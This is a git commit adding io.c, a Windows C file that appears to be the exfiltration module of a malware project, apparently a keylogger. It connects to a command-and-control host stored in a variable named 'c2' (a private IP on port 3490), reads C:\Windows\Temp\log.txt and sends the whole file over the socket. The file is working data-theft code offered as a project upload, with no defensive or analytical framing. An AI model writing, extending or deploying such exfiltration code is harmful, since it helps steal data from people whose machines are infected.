25d245d3f93373e43c0f8803e17f558945663a94
Peter Kim <tweaked540@gmail.com>
2018-03-04 22:24:38 -0800

    Add files via upload

---
+++ version1/io.c
@@ -0,0 +1,115 @@
+#include <stdio.h>
+#include <ws2tcpip.h>
+#include <winsock.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <stdlib.h>
+
+#include "io.h"
+
+#pragma comment(lib, "ws2_32.lib")
+
+int sock;
+struct addrinfo hints, *c2;
+
+int socket_setup(void)
+{
+	// Start WSA stuff
+	WSADATA wsaData;
+	
+	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0)
+	{
+		return 1;
+	}
+	
+	// ensure that hints struct is empty
+	memset(&hints, 0, sizeof(hints));
+	
+	// fill out hints with relevant wants
+	hints.ai_family = AF_UNSPEC;
+	hints.ai_socktype = SOCK_STREAM;
+	
+	// use getaddrinfo to fill out the rest of the struct
+	getaddrinfo("192.168.2.13", "3490", &hints, &c2);
+	
+	// create socket
+	if ((sock = socket(c2->ai_family, c2->ai_socktype, c2->ai_protocol)) == INVALID_SOCKET)
+	{
+		return 1;
+	}
+	
+	return 0;
+}
+
+int socket_connect(void)
+{
+	// connect to server
+	if (connect(sock, c2->ai_addr, c2->ai_addrlen) < 0)
+	{
+		return 1;
+	}
+	
+	return 0;
+}
+
+int socket_sendfile(void)
+{
+	int err	= 0; 
+	int res	= 0;	
+	int len = 0;
+
+	DWORD bytes_read	= 0;
+
+	char file_size[12]	= {0};
+
+	HANDLE out_file		= NULL;
+
+	LARGE_INTEGER fsize;
+
+	out_file = CreateFile( "C:\\Windows\\Temp\\log.txt", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (out_file == INVALID_HANDLE_VALUE) 
+	{
+		err = GetLastError();
+		return 1;
+	}	
+	
+	if (res = GetFileSizeEx(out_file, &fsize) == 0)
+	{
+		err = GetLastError();
+		return 1;
+	}
+	
+	void *read_buffer = calloc((fsize.QuadPart + 1), sizeof(char)); 
+	if (read_buffer == NULL)
+	{
+		return 1;
+	}
+
+	if(res = ReadFile(out_file, read_buffer, fsize.QuadPart, &bytes_read, NULL) == 0)
+	{
+		return 1;
+	}
+	
+	res = send(sock, read_buffer, fsize.QuadPart, 0);
+
+	if(res <= 0)
+	{
+		return 1;
+	}
+
+
+	free(read_buffer);	
+	CloseHandle(out_file);
+	return 0;
+}
+
+int socket_cleanup(void)
+{
+	// close socket and clean up
+	closesocket(sock);
+	WSACleanup();
+	return 0;
+}
+
+
